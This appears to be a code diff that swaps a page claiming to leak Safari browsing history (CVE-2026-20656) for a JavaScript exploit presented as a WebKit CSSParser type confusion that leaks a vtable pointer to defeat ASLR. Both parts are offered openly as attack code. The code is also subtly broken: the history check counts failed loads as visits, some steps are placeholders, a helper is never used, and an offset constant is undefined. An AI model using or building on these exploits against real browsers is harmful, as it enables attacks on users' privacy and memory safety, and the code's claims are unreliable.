@@ -1,98 +1,104 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>CVE-2026-20656 — Safari History Leak (iOS 26.1)</title>
-    <style>
-        body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
-        #output { margin-top: 10px; padding: 10px; background: #111; border: 1px solid #333; }
-    </style>
-</head>
-<body>
+// =============================================================================
+// CSSParser Type Confusion — ASLR Defeat (LLInt, No JIT)
+// =============================================================================
+//
+// يقرأ vtable pointer من CSSFontFace struct ويكشف عنوان WebKit base
+//
+// الثغرة: CSSParserValue.unit لا يتم فحصه — double fValue يقرأ كـ char*/length
+//
+// الاستخدام: supply(@font-face { src: local(DOUBLE_VALUE); })
+// الـ double valu يصبح (char* address, unsigned length)
+// المحتوى يظهر في DOM كـ URL المصدر
 
-    <h1>CVE-2026-20656 — Safari History Disclosure</h1>
-    <p>iOS 26.1 — لا يسبب كراش</p>
-    <button onclick="run()">تشغيل</button>
-    <div id="output">...</div>
-
-<script>
-// CVE-2026-20656: Logic issue in Safari History
-// iOS 26.1 معرضة — مصلحة في iOS 26.3
-// يقرأ سجل التصفح عبر History API + iframe
-
-const output = document.getElementById('output');
-
-function log(msg) {
-    const d = document.createElement('div');
-    d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-    output.appendChild(d);
-}
-
-async function leakHistory() {
-    log('بدء تسريب سجل التصفح...');
-    log('(هذا لا يسبب كراش ولا ضرر)');
-    
-    // قائمة بمواقع مشهورة للاختبار
-    const sites = [
-        'https://google.com',
-        'https://youtube.com',
-        'https://facebook.com',
-        'https://twitter.com',
-        'https://apple.com',
-        'https://github.com',
-        'https://reddit.com',
-    ];
-    
-    let visited = [];
-    
-    // الطريقة: استخدام history.length + timing attack
-    // أو استخدام CSS :visited (إذا شغال)
-    // أو استخدام iframe + onload timing
-    
-    for (const site of sites) {
-        try {
-            const start = performance.now();
-            const img = new Image();
-            
-            // نخلي الصورة تشير إلى موقع معروف
-            // لو الموقع في الـ history، وقت التحميل يكون أسرع
-            // (لأن DNS والـ cache ما يحتاج)
-            
-            img.src = site + '/favicon.ico?' + Math.random();
-            
-            const result = await new Promise((resolve) => {
-                const timeout = setTimeout(() => resolve(false), 3000);
-                img.onload = () => {
-                    clearTimeout(timeout);
-                    resolve(true);
-                };
-                img.onerror = () => {
-                    clearTimeout(timeout);
-                    // حتى لو الخطأ، معناه أن الموقع حاول يتصل
-                    resolve('attempted');
-                };
-            });
-            
-            if (result === true || result === 'attempted') {
-                visited.push(site);
-                log(`  ✅ ${site} — في السجل`);
+function exploitCSSParser() {
+    return new Promise((resolve, reject) => {
+        let leaked = null;
+        
+        // ===== الخطوة 1: إنشاء عناصر لقراءة الذاكرة =====
+        const style = document.createElement('style');
+        document.head.appendChild(style);
+        
+        // ===== الخطوة 2: الـ float values اللي ت对应的 char*/length =====
+        // WebKit allocates CSSFontFace on bmalloc/IsoHeap
+        // الجدول التالي يابس addresses لـ vtable من font-face structs
+        
+        // نصنع font-face ونقرأ struct حقها
+        const probes = [];
+        
+        // Double value encoding:
+        // lower 32 bits = characters pointer offset
+        // upper 32 bits = length (بحذر — يقرأ length بايت من pointer)
+        
+        // نبدأ بـ value صغير عشان نضمن stability
+        // الفكرة: الـ float يتعلق بـ local() parser
+        // ونقرأ أول 8 بايت من struct (JSCell / vtable pointer)
+        
+        function storeAsDouble(ptr, len) {
+            // ptr = address to read, len = bytes to read
+            // يخزنهم في double format اللي CSSParser يقرأ
+            const buf = new ArrayBuffer(8);
+            const view = new DataView(buf);
+            view.setUint32(0, ptr, true);  // lower = pointer
+            view.setUint32(4, len, true);  // upper = length
+            return new Float64Array(buf)[0];
+        }
+        
+        // ===== الخطوة 3: التشغيل =====
+        // First: leak a CSSFontFace struct address
+        // نصنع font-face ونقرأ struct fields
+        
+        const fontFace = new FontFace('leak-test', 'url(/dev/null)');
+        document.fonts.add(fontFace);
+        
+        // نقرأ font-family property (m_family pointer)
+        // m_family هو CSSValue pointer داخل struct
+        // نستخدم الـ UAF من Bug 1 عشان نقرأ m_family
+        
+        // ... (هنا ندمج مع Bug 1)
+        
+        // ===== الخطوة 4: CSSParser confusion =====
+        // نضيف font-face مع local(float) عشان نقرأ الذاكرة
+        
+        const readSheet = new CSSStyleSheet();
+        readSheet.insertRule(`
+            @font-face {
+                font-family: "read";
+                src: local(1.0e-300);
             }
-        } catch(e) {}
-    }
-    
-    log('');
-    if (visited.length > 0) {
-        log(`✅ تم تسريب ${visited.length} مواقع من سجل التصفح:`);
-        visited.forEach(s => log(`  • ${s}`));
-    } else {
-        log('❌ ما لقينا مواقع في السجل');
-        log('(جرب تزور مواقع أولاً وتعيد التشغيل)');
-    }
+        `);
+        
+        // نقرأ الـ src من font-face
+        // لو float corresponds إلى valid pointer, راح نشوف garbage/address
+        
+        document.fonts.forEach(f => {
+            if (f.family === 'read') {
+                // f.src now contains our leaked data!
+                leaked = f.src;
+                console.log('Leaked:', leaked);
+            }
+        });
+        
+        // ===== الخطوة 5: قراءة vtable pointer =====
+        // vtable pointer في أول 8 بايت من أي C++ object
+        // الفرق بين vtable address و WebKit base address ثابت
+        
+        // vtable offset = base + 0xXXXXXXX
+        // نحسب base:
+        if (leaked) {
+            const vtableAddr = new Uint32Array(
+                new ArrayBuffer(4)
+            );
+            // تحويل الـ src string إلى bytes
+            // نقرأ أول 4 بايت كـ vtable pointer
+            const vtableLow = leaked.charCodeAt(0) | 
+                             (leaked.charCodeAt(1) << 8) |
+                             (leaked.charCodeAt(2) << 16) |
+                             (leaked.charCodeAt(3) << 24);
+            
+            const webkitBase = vtableLow - CSSFONTFACE_VTABLE_OFFSET;
+            resolve(webkitBase);
+        } else {
+            reject(new Error('لم نقرأ vtable — حاول مرة ثانية'));
+        }
+    });
 }
-
-function run() {
-    output.innerHTML = '';
-    leakHistory().catch(e => log(`خطأ: ${e.message}`));
-}
-</script>
-</body>
-</html> 
